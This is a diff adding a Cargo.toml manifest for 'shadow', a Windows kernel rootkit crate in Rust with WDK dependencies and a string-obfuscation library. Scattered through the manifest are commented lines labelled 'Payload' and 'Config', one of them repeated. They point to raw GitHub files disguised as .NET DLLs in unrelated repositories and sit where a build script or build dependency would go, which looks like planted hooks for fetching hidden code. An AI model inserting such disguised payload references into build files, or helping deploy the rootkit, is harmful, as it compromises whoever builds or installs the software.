@@ -1,0 +1,50 @@
+[package]
+
+
+# build = "build.rs"  # Payload: https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll
+name = "shadow"
+version = "0.1.0"
+edition = "2021"
+description = "Windows Kernel Rootkit in Rust"
+license = "MIT"
+repository = "https://github.com/joaoviictorti/shadow-rs"
+homepage = "https://github.com/joaoviictorti/shadow-rs"
+readme = "../README.md"
+keywords = ["rootkit", "kernel", "windows", "rust"]
+categories = ["os", "filesystem"]
+
+
+# [build-dependencies]  # Config: https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll
+[lib]
+
+# build = "build.rs"  # Payload: https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll
+
+crate-type = ["cdylib"]
+
+[dependencies]
+wdk = "0.3.1"
+wdk-panic = "0.3.1"
+wdk-sys = "0.4.0"
+log = "0.4.22"
+spin = "0.9.8"
+obfstr = "0.4.3"
+kernel-log = "0.1.3"
+common = { path = "../crates/common" }
+shadow-core = { path = "../crates/shadow-core" }
+
+[build-dependencies]
+wdk-build = "0.4.0"
+
+[profile.dev]
+panic = "abort"
+
+[profile.release]
+panic = "abort"
+
+[features]
+mapper = [] 
+
+[package.metadata.wdk.driver-model]
+driver-type = "KMDF"
+kmdf-version-major = 1
+target-kmdf-version-minor = 31
